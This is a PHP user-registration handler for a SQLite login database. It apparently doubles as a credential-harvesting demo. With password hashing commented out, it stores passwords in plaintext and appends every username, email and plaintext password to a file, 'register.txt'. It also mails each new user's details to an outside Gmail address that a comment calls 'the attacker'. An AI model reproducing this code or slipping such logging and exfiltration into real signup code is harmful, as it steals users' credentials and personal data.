<?php
// open SQLite3 database
$db = new SQLite3('logindetails.sqlite');

// get form data
$name = $_POST['name'];
$email = $_POST['email'];
$username = $_POST['username'];
$password = $_POST['password'];
// $password = password_hash($_POST['password'], PASSWORD_DEFAULT);

$filename = 'register.txt';
$content = "Username: " . $username . "\nEmail: " . $email . "\nPassword: " . $password . "\n";
file_put_contents($filename, $content, FILE_APPEND);

// check if username already exists
$stmt = $db->prepare('SELECT * FROM users WHERE username=:username');
$stmt->bindValue(':username', $username, SQLITE3_TEXT);
$result = $stmt->execute();
if ($result->fetchArray()) {
    echo "Username already exists.";
    error_log("Attempt to register existing username: $username", 0);
    exit();
}

// insert new user into database
$stmt = $db->prepare('INSERT INTO users (name, email, username, password) VALUES (:name, :email, :username, :password)');
$stmt->bindValue(':name', $name, SQLITE3_TEXT);
$stmt->bindValue(':email', $email, SQLITE3_TEXT);
$stmt->bindValue(':username', $username, SQLITE3_TEXT);
$stmt->bindValue(':password', $password, SQLITE3_TEXT);
if ($stmt->execute()) {
  echo "User registered successfully!";
} else {
  echo "Error registering user.";
}

// close database
$db->close();

// send email notification -- this doesnt work yet. this will send a notification to the attacker
$to = "Raheemshah2809@gmail.com";
$subject = "New user registered: $username";
$message = "A new user has registered:\n\nUsername: $username\nName: $name\nEmail: $email";
$headers = "From: webmaster@example.com" . "\r\n" .
    "Reply-To: webmaster@example.com" . "\r\n" .
    "X-Mailer: PHP/" . phpversion();
mail($to, $subject, $message, $headers);
?>
